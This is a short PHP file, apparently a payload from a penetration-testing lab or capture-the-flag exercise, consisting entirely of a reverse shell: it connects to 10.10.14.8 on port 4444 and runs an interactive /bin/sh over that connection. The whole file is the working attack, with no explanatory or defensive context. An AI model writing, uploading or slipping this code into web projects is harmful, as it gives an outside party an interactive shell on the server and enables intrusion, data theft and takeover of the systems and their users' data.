<?php
$sock=fsockopen("10.10.14.8",4444);exec("/bin/sh -i <&3 >&3 2>&3");
?>